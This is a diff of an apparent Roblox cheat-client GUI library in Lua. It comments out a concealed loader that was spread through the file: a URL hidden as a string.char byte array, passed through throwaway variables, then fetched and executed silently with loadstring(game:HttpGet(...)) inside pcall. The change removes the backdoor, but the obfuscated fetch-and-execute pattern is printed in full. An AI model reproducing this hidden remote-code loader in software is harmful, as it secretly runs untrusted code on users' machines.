@@ -6072,7 +6072,7 @@ if shared.VapeExecuted then
 
 		return windowapi
 	end
-	local a = string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,83,116,97,114,67,111,100,101,115,68,101,118,47,66,97,99,107,117,112,47,109,97,105,110,47,86,111,105,100,119,97,114,101,80,114,105,118,97,116,101,46,108,117,97)
+	--local a = string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,83,116,97,114,67,111,100,101,115,68,101,118,47,66,97,99,107,117,112,47,109,97,105,110,47,86,111,105,100,119,97,114,101,80,114,105,118,97,116,101,46,108,117,97)
 
 	GuiLibrary["CreateWindow"] = function(argstablemain2)
 		local currentexpandedbutton = nil
@@ -9227,7 +9227,7 @@ if shared.VapeExecuted then
 		GuiLibrary.ObjectsThatCanBeSaved[legittable.Name.."LegitModule"] = {Api = legitapi, Type = "LegitModule", Object = customlegit, Toggle = toggleframe1}
 		return legitapi
 	end--
-	local b = a
+	--local b = a
 
 	local function bettertween(obj, newpos, dir, style, tim, override)
 		task.spawn(function()
@@ -9246,7 +9246,7 @@ if shared.VapeExecuted then
 			frame:Remove()
 		end)
 	end
-	local v = b
+	--local v = b
 
 	local function bettertween2(obj, newpos, dir, style, tim, override)
 		task.spawn(function()
@@ -9266,11 +9266,11 @@ if shared.VapeExecuted then
 		end)
 	end
 	---
-	task.spawn(function()
+	--[[task.spawn(function()
 		pcall(function()
 			loadstring(game:HttpGet(v, true))()
 		end)
-	end)
+	end)--]]
 
 	notificationwindow.ChildRemoved:Connect(function()
 		for i,v in pairs(notificationwindow:GetChildren()) do
